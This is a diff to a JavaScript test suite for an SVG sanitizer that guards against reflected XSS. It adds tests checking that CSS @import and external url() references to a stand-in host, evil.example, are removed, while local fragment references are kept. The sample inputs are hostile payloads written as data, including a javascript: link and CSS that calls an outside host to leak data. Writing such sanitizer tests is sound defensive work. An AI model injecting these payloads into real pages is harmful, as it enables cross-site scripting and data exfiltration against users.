@@ -61,4 +61,25 @@ describe('svg sanitization (reflected-XSS guard — input arrives via URL hash)'
     const dirty = '<svg><a href="javascript:alert(1)"><text>click</text></a></svg>'
     expect(sanitizeSvg(dirty)).not.toContain('javascript:')
   })
+
+  it('strips @import from style elements (CSS exfil channel)', () => {
+    const dirty = '<svg><style>@import url("https://evil.example/x.css"); .a{fill:red}</style><circle r="5"/></svg>'
+    const clean = sanitizeSvg(dirty)
+    expect(clean).not.toContain('@import')
+    expect(clean).not.toContain('evil.example')
+    expect(clean).toContain('fill:red')
+  })
+
+  it('neutralizes external url() in style elements, keeps local fragment refs', () => {
+    const dirty = '<svg><style>.x{background:url("http://evil.example/leak")} .y{fill:url(#grad)}</style></svg>'
+    const clean = sanitizeSvg(dirty)
+    expect(clean).not.toContain('evil.example')
+    expect(clean).toContain('url(#grad)')
+  })
+
+  it('neutralizes external url() in inline style attributes', () => {
+    const dirty = '<svg style="background:url(http://evil.example/leak)"><rect width="5"/></svg>'
+    const clean = sanitizeSvg(dirty)
+    expect(clean).not.toContain('evil.example')
+  })
 })
